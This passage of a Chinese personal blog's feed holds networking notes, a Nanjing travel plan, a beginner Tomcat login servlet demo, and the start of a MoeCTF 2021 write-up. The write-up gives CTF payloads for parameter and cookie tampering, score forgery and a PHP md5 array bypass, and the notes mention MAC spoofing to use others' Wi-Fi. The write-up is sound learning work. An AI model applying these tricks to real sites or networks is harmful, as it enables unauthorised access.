href="#Serial串口，路由器与路由器相连之间用串口" class="headerlink" title="Serial串口，路由器与路由器相连之间用串口"></a>Serial串口，路由器与路由器相连之间用串口</h6></li></ol><h6 id="NAT-Network-Address-Translation-转换"><a href="#NAT-Network-Address-Translation-转换" class="headerlink" title="NAT(Network Address Translation)转换"></a>NAT(Network Address Translation)转换</h6><ol><li><h6 id="路由器将私网IP转换为公网IP"><a href="#路由器将私网IP转换为公网IP" class="headerlink" title="路由器将私网IP转换为公网IP"></a>路由器将私网IP转换为公网IP</h6></li><li><h6 id="导致不同局域网之间的私网IP相同"><a href="#导致不同局域网之间的私网IP相同" class="headerlink" title="导致不同局域网之间的私网IP相同"></a>导致不同局域网之间的私网IP相同</h6></li><li><h6 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h6><ol><li><h6 id="可以节约公网IP"><a href="#可以节约公网IP" class="headerlink" title="可以节约公网IP"></a>可以节约公网IP</h6></li><li><h6 id="会隐藏内部真实IP"><a href="#会隐藏内部真实IP" class="headerlink" title="会隐藏内部真实IP"></a>会隐藏内部真实IP</h6></li></ol></li></ol><h4 id="网络互连模型"><a href="#网络互连模型" class="headerlink" title="网络互连模型:"></a>网络互连模型:</h4><ol><li><h5 id="OSI参考模型7层"><a href="#OSI参考模型7层" class="headerlink" title="OSI参考模型7层"></a>OSI参考模型7层</h5></li><li><h6 id="TCP-IP协议4层"><a href="#TCP-IP协议4层" class="headerlink" title="TCP/IP协议4层"></a>TCP/IP协议4层</h6></li><li><h6 id="学习研究-5层-数据链路层-物理层"><a href="#学习研究-5层-数据链路层-物理层" class="headerlink" title="学习研究 5层(数据链路层+物理层)"></a>学习研究 5层(数据链路层+<code>物理层</code>)</h6></li></ol><h4 id="Java搭建服务器开发环境"><a href="#Java搭建服务器开发环境" class="headerlink" title="Java搭建服务器开发环境"></a>Java搭建服务器开发环境</h4><h6 id="利用JavaWeb和tomcat搭建本地测试环境"><a href="#利用JavaWeb和tomcat搭建本地测试环境" class="headerlink" title="利用JavaWeb和tomcat搭建本地测试环境"></a>利用JavaWeb和tomcat搭建本地测试环境</h6><h6 id="略"><a href="#略" class="headerlink" title="略"></a>略</h6><h6 id="计算机之间通信基础"><a href="#计算机之间通信基础" class="headerlink" title="计算机之间通信基础"></a>计算机之间通信基础</h6><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">IP地址</span> <span class="hljs-literal">-</span>&gt; <span class="hljs-comment">网卡(MAC地址)</span>  --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">通信</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>  <span class="hljs-comment">网卡</span> <span class="hljs-literal">-</span>&gt; <span class="hljs-comment">IP地址</span><br><span class="hljs-comment">最终是根据MAC地址(网卡地址)，输送数据到网卡，被网卡接受</span><br></code></pre></td></tr></table></figure><h2 id="计算机之间的连接方式"><a href="#计算机之间的连接方式" class="headerlink" title="计算机之间的连接方式"></a>计算机之间的连接方式</h2><ol><li><h6 id="网线直连"><a href="#网线直连" class="headerlink" title="网线直连"></a>网线直连</h6><ol><li>Cisco Packet Tracer仿真软件使用(真香)</li></ol></li><li><h6 id="同轴电缆-一根线连起来，效率低"><a href="#同轴电缆-一根线连起来，效率低" class="headerlink" title="同轴电缆 (一根线连起来，效率低)"></a>同轴电缆 (一根线连起来，效率低)</h6><ol><li>半双工通信</li><li>容易冲突</li><li>不安全</li></ol></li><li><h6 id="集线器-Hub"><a href="#集线器-Hub" class="headerlink" title="集线器(Hub)"></a>集线器(Hub)</h6><ol><li>半双工通信</li><li>无筛选/存储功能，直接广播数据包</li><li>长时间占用带宽</li></ol></li><li><h6 id="网桥-bridge"><a href="#网桥-bridge" class="headerlink" title="网桥(bridge)"></a>网桥(bridge)</h6><ol><li>通过自学习功能构建MAC地址表</li><li>对发来的数据包检测，起到一定筛选作用。比集线器提高效率，隔绝冲突域</li></ol></li><li><h6 id="交换机-Switch-集线器-多接口网桥"><a href="#交换机-Switch-集线器-多接口网桥" class="headerlink" title="交换机(Switch) 集线器+多接口网桥"></a>交换机(Switch) 集线器+多接口网桥</h6><ol><li>全双工通信</li><li>局域网的最终方案</li></ol></li><li><h6 id="路由器-Router"><a href="#路由器-Router" class="headerlink" title="路由器(Router)"></a>路由器(Router)</h6><ol><li><p>可以在不同网段之间传送数据(需借用网关)</p></li><li><p>隔绝广播域(不同网段)</p><p><img src="https://i.loli.net/2021/10/23/8znfK9YgHsyoauP.png" alt="2"></p></li></ol></li></ol><h6 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h6><ol><li>arp -a查看当前计算机缓存MAC地址</li><li>ping命令使用的ICMP协议</li></ol><h2 id="MAC地址-Media-Access-Control-Address"><a href="#MAC地址-Media-Access-Control-Address" class="headerlink" title="MAC地址(Media Access Control Address)"></a>MAC地址(Media Access Control Address)</h2><ol><li>每一个网卡都有固化的一个6字节(48bit)的MAC地址</li><li>前三字节:组织唯一标识符，厂家号,后三字节:网络接口标识符，厂家分配的号</li><li>使用ipconfig 查看主机MAC地址</li><li>FF-FF-FF-FF-FF-FF为广播MAC地址</li><li>可利用修改MAC地址蹭网</li><li>获取成功对方MAC地址，会将MAC地址进行缓存，称为ARP缓存</li></ol><h2 id="IP地址-Internet-Protocol-Address"><a href="#IP地址-Internet-Protocol-Address" class="headerlink" title="IP地址(Internet Protocol Address)"></a>IP地址(Internet Protocol Address)</h2><h6 id="IPV4-4字节-IPV6-16字节"><a href="#IPV4-4字节-IPV6-16字节" class="headerlink" title="IPV4 (4字节) IPV6(16字节)"></a>IPV4 (4字节) IPV6(16字节)</h6><ol><li>IP地址有网络标识+主机标识表示</li><li>子网掩码:用来算网段(IP地址与子网掩码=网段号)</li><li>IP地址分类<ol><li>A类,B类,C类,D类,E类(具体细节略)</li><li>区别:子网掩码不同，开头不同</li><li>主机地址全0位网段地址，全1为网段所有IP主机</li></ol></li><li>子网掩码的CIDR表示方法<ol><li>192.168.1.1/24 24代表24个1，子网掩码为255.255.255.0</li></ol></li><li>子网划分<ol><li>借用主机位作子网位，划分成多个子网，避免IP地址浪费</li><li>等长子网划分/变长子网划分</li></ol></li><li>超网:<ol><li>跟子网相反，将多个连续的网段合并成一个更大的网段</li><li>若合并网段，需连续的网段</li></ol></li></ol><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><ol><li><p>在不同网段间转发数据，需要有路由器的支持</p></li><li><p>默认情况下，路由器只知道与他直连的网段，非直连的网段都要通过静态路由，动态路由告诉他</p><ol><li><p>静态路由</p><p>管理员手动添加路由信息，适用于小规模网络(手动配置路由表)</p></li><li><p>动态路由</p><p>路由器通过路由选择协议(RIP，OSPF)自动获取路由信息，适用于大规模网络(自动配置路由表)</p></li></ol></li></ol><h2 id="数据包的传输过程"><a href="#数据包的传输过程" class="headerlink" title="数据包的传输过程"></a>数据包的传输过程</h2><ol><li><p>数据包(IP不变，MAC地址实时更改)</p><table><thead><tr><th align="left">数据</th><th>值</th></tr></thead><tbody><tr><td align="left">源IP</td><td>192.168.1.10</td></tr><tr><td align="left">目标IP</td><td>192.168.3.10</td></tr><tr><td align="left">源MAC</td><td>M1(实时更改)</td></tr><tr><td align="left">目标MAC</td><td>M2(实时更改)</td></tr><tr><td align="left"></td><td></td></tr></tbody></table></li></ol><h2 id="家用路由器"><a href="#家用路由器" class="headerlink" title="家用路由器"></a>家用路由器</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">内部结构为一个路由器和一个交换机，所连接的设备在同一个网段内 0<br></code></pre></td></tr></table></figure><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京旅游攻略(初版)</title>
    <link href="/2021/09/29/life/%E6%94%BB%E7%95%A5/"/>
    <url>/2021/09/29/life/%E6%94%BB%E7%95%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="南京ohy"><a href="#南京ohy" class="headerlink" title="南京ohy"></a>南京ohy</h1><span id="more"></span><h2 id="10月2日"><a href="#10月2日" class="headerlink" title="10月2日"></a>10月2日</h2><ol><li><p>行</p><ol><li>13.51-16.24 高铁二等 163元</li><li>15.01-17.47  高铁二等 163元</li><li>17.12-19.34 高铁二等 163元</li><li>23.13-4.39(+1) 高铁 108元 暂时无票需候补抢票   (推荐，可以车上过夜，少一夜住宿费)</li><li>16.58-00.51(+1) 火车 硬座7</li></ol></li></ol><h2 id="10月3日"><a href="#10月3日" class="headerlink" title="10月3日"></a>10月3日</h2><ol><li>行<ol><li>早上 玄武湖(出了南京站即是)免门票，几个小岛，情侣园(没情侣呜呜)-&gt;玄武湖-&gt;梁洲-&gt;(先锋诗歌书店/先锋虫子书店)环洲-&gt;樱洲，秋天应该会比较美。<ol><li>估计3~4小时,可观光车可划船/50元</li></ol></li><li>明城墙/30元 (顺着玄武湖出来即是)，可以眺望鸡鸣寺和玄武湖,1~2小时</li><li>鸡鸣寺/10元(南朝四百八十寺，多少楼台烟雨中) 2~3小时</li><li>从寺出来步行500米到东南大学打卡</li><li>乘坐地铁1km到南京大学打卡(学校如可进入的话进去逛逛)  大学共计2~3小时</li><li>学人旧书店(蛮喜欢一些旧物，似乎可以看到它的前世今生) 1~2小时</li><li>南大附近的鼓楼，1~2小时</li><li>新街口(南京最繁华的地方)   //看看就行吧</li></ol></li></ol><h2 id="10月4日"><a href="#10月4日" class="headerlink" title="10月4日"></a>10月4日</h2><ol><li>行<ol><li>总统府(孙中山故居？可以去看看) 2小时</li><li>旁边的南京1912街区(民国风)拍照挺好 估计是个商业圈,逛逛就行 2小时</li><li>明故宫,朱元璋老宅/免门票  午朝门 2小时</li><li>南京博物院(中国三大博物院之一)/免费  需提起预约(重点)(周一闭馆/开馆时间9.-17.) 2~3小时</li><li>明孝陵(和美龄宫再同一景区，建议买套票便宜)</li><li>美龄宫(感受蒋介石与美龄的爱情故事)</li><li>中山陵(周一闭馆，免门票)  剩下时间</li></ol></li></ol><h2 id="10月5日"><a href="#10月5日" class="headerlink" title="10月5日"></a>10月5日</h2><ol><li>行<ol><li>先锋书店(五台山总店),在一座城留下自己的足迹 2小时</li><li>西桥(拍照打卡地)紫峰大厦(感受乡村与城市的交融)科幻感 2小时</li><li>颐和路/颐和公馆(一段民国时期的建筑群,各种名人故居  3~4小时</li><li>日军侵华南京大屠杀遇难同胞纪念馆(提起南京第一件想到的，铭记历史，勿忘国耻) 2小时</li><li>瞻园</li><li>夫子庙(建议晚上去，)/夜游秦淮河(似乎是白蛇传取景地？？？)</li><li>乌衣巷(刘禹锡/朱雀桥边野草花，乌衣巷口夕阳斜)</li><li>江南贡院(古代科举考试地方)/秦淮画舫/白鹭洲/老门东</li></ol></li></ol><h2 id="10月6日"><a href="#10月6日" class="headerlink" title="10月6日"></a>10月6日</h2><ol><li>行<ol><li>回家</li><li>18.55-8.14(+1)火车硬卧？</li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>诗与远方</category>
      
    </categories>
    
    
    <tags>
      
      <tag>life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探前后端交互</title>
    <link href="/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/"/>
    <url>/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/</url>
    
    <content type="html"><![CDATA[<h1 id="初探前后端交互"><a href="#初探前后端交互" class="headerlink" title="初探前后端交互"></a>初探前后端交互</h1><h2 id="如有错误请不吝指出"><a href="#如有错误请不吝指出" class="headerlink" title="如有错误请不吝指出"></a>如有错误请不吝指出</h2><span id="more"></span><h6 id="由于学习网络协议，需通过C-S进行试验，故利用JavaWeb-TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作"><a href="#由于学习网络协议，需通过C-S进行试验，故利用JavaWeb-TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作" class="headerlink" title="由于学习网络协议，需通过C/S进行试验，故利用JavaWeb+TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作"></a>由于学习网络协议，需通过C/S进行试验，故利用JavaWeb+TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作</h6><h2 id="Step1-准备"><a href="#Step1-准备" class="headerlink" title="Step1(准备):"></a>Step1(准备):</h2><ol><li><h6 id="创建空pooject并导入java模块"><a href="#创建空pooject并导入java模块" class="headerlink" title="创建空pooject并导入java模块"></a>创建空pooject并导入java模块</h6></li><li><h6 id="添加JavaWeb框架"><a href="#添加JavaWeb框架" class="headerlink" title="添加JavaWeb框架"></a>添加JavaWeb框架</h6></li><li><h6 id="部署TomCat以及导入Tomcat外部库-相当于服务器托管给TomCat"><a href="#部署TomCat以及导入Tomcat外部库-相当于服务器托管给TomCat" class="headerlink" title="部署TomCat以及导入Tomcat外部库(相当于服务器托管给TomCat)"></a>部署TomCat以及导入Tomcat外部库(相当于服务器托管给TomCat)</h6></li></ol><h2 id="Step2-前端测试-："><a href="#Step2-前端测试-：" class="headerlink" title="Step2(前端测试)："></a>Step2(前端测试)：</h2><ol><li><h6 id="web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码"><a href="#web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码" class="headerlink" title="web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码"></a>web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>this is a test .html<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="2-Web文件夹相当于网站根路径-访问http-localhost-8080-html-test-html即可访问"><a href="#2-Web文件夹相当于网站根路径-访问http-localhost-8080-html-test-html即可访问" class="headerlink" title="2.Web文件夹相当于网站根路径,访问http://localhost:8080/html/test.html即可访问"></a>2.Web文件夹相当于网站根路径,访问<a href="http://localhost:8080/html/test.html%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE">http://localhost:8080/html/test.html即可访问</a></h6></li></ol><h2 id="Step3-前后端交互"><a href="#Step3-前后端交互" class="headerlink" title="Step3(前后端交互):"></a>Step3(前后端交互):</h2><ol><li><h6 id="web文件夹下创建login-html-构建一个form表单"><a href="#web文件夹下创建login-html-构建一个form表单" class="headerlink" title="web文件夹下创建login.html,构建一个form表单"></a>web文件夹下创建login.html,构建一个form表单</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/study/login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>用户名<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>密码<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><h6 id="src文件夹下创建LoginServlet-java"><a href="#src文件夹下创建LoginServlet-java" class="headerlink" title="src文件夹下创建LoginServlet.java"></a>src文件夹下创建LoginServlet.java</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mj.servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/login&quot;)</span>  <span class="hljs-comment">//相当于在网站根路径创建文件login</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br><span class="hljs-comment">//        super.doGet(req, resp);</span><br>        System.out.println(<span class="hljs-string">&quot;doget---&quot;</span>);<br>        String username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>        String password = req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>        System.out.println(username+<span class="hljs-string">&quot; &quot;</span>+password);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;123&quot;</span>.equals(username)&amp;&amp;<span class="hljs-string">&quot;456&quot;</span>.equals(password))&#123;<br>            <span class="hljs-comment">//登录成功</span><br>            resp.getWriter().write(<span class="hljs-string">&quot;login success&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            resp.getWriter().write(<span class="hljs-string">&quot;login failure&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><h6 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h6><h6 id="在http-localhost-8080-study-html-login-html输入用户名和密码"><a href="#在http-localhost-8080-study-html-login-html输入用户名和密码" class="headerlink" title="在http://localhost:8080/study/html/login.html输入用户名和密码"></a>在<a href="http://localhost:8080/study/html/login.html%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81">http://localhost:8080/study/html/login.html输入用户名和密码</a></h6><p><img src="/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/2.png" alt="2"></p><h6 id="即可跳转到localhost-8080-study-login"><a href="#即可跳转到localhost-8080-study-login" class="headerlink" title="即可跳转到localhost:8080/study/login"></a>即可跳转到localhost:8080/study/login</h6></li></ol><p><img src="/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/3.png" alt="2"></p><h6 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h6><p><img src="/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/1.png" alt="2"></p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>前后端</tag>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MoeCTF</title>
    <link href="/2021/09/26/CTF/moectf/"/>
    <url>/2021/09/26/CTF/moectf/</url>
    
    <content type="html"><![CDATA[<h1 id="MoeCTF-2021-Write-Up"><a href="#MoeCTF-2021-Write-Up" class="headerlink" title="MoeCTF-2021 Write Up"></a>MoeCTF-2021 Write Up</h1><span id="more"></span><h4 id="人生第一篇wp，如有错误请不吝指出"><a href="#人生第一篇wp，如有错误请不吝指出" class="headerlink" title="人生第一篇wp，如有错误请不吝指出"></a>人生第一篇wp，如有错误请不吝指出</h4><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h6 id="1-Web安全入门指北—GET"><a href="#1-Web安全入门指北—GET" class="headerlink" title="1.Web安全入门指北—GET"></a>1.Web安全入门指北—GET</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">payload:<span class="hljs-attribute">moe</span>=flag<br></code></pre></td></tr></table></figure><h6 id="2-Web安全入门指北—POST"><a href="#2-Web安全入门指北—POST" class="headerlink" title="2.Web安全入门指北—POST"></a>2.Web安全入门指北—POST</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.利用hackbar传入post参数<span class="hljs-attribute">moe</span>=flag<br>2.利用bp(burpsuite)抓包更改post参数为<span class="hljs-attribute">moe</span>=flag<br>3.利用python requests库写脚本<br></code></pre></td></tr></table></figure><h6 id="3-Web安全入门指北—小饼干"><a href="#3-Web安全入门指北—小饼干" class="headerlink" title="3.Web安全入门指北—小饼干"></a>3.Web安全入门指北—小饼干</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.利用bp抓包将cookie中的vip设为<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h6 id="4-2048"><a href="#4-2048" class="headerlink" title="4.2048"></a>4.2048</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">起初思路:<br><span class="hljs-number">1.</span>查看网页js代码可知分数由score参数控制，故想在<span class="hljs-built_in">console</span>更改score初始值，提交到网页后端。未遂<br>正确解法:<br><span class="hljs-number">2.</span>仔细审查源代码发现<br><span class="hljs-attr">getFlag</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> XMLHttpRequest;<br>req.open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;flag.php?score=&quot;</span>+obj.score,<span class="hljs-literal">true</span>);<br>req.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>alert(<span class="hljs-built_in">this</span>.responseText);<br>&#125;<br>req.send();<br>&#125;<br>&#125;<br>故只需构造payload:?score=<span class="hljs-number">500000</span>即可<br></code></pre></td></tr></table></figure><h6 id="5-Web-Inc"><a href="#5-Web-Inc" class="headerlink" title="5.Web_Inc"></a>5.Web_Inc</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>!=<span class="hljs-variable">$b</span>&amp;&amp;md5(<span class="hljs-variable">$a</span>)===md5(<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;try again&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span>考察知识<br><span class="hljs-built_in">get</span>/<span class="hljs-built_in">post</span> md5绕过<br><span class="hljs-number">2.</span>解决方法<br>===会比较类型，可以用到PHP中md5()函数无法处理数组（会返回<span class="hljs-literal">NULL</span>）来实现绕过。<br>构造payload:<br><span class="hljs-keyword">a</span>[]=<span class="hljs-number">1</span> b[]=<span class="hljs-number">2</span>即可<br></code></pre></td></tr></table></figure><h6 id="6-ezinclude"><a href="#6-ezinclude" class="headerlink" title="6.ezinclude"></a>6.ezinclude</h6><figure class="highlight php"><table><tr><td 